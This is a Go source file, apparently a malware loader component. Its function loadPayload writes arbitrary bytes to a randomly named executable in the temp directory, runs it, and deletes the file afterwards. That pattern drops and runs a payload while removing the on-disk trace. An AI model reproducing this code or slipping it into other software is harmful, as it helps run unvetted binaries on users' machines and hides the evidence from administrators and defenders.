//go:build !windows

package main

import (
	"crypto/rand"
	"encoding/hex"
	"os"
	"os/exec"
)

func loadPayload(payload []byte) {
	tmp := os.TempDir() + string(os.PathSeparator) + randHex(8)
	if err := os.WriteFile(tmp, payload, 0755); err != nil {
		return
	}
	cmd := exec.Command(tmp)
	_ = cmd.Start()
	// Schedule cleanup after a few seconds
	go func() {
		_ = cmd.Wait()
		_ = os.Remove(tmp)
	}()
}

func randHex(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}
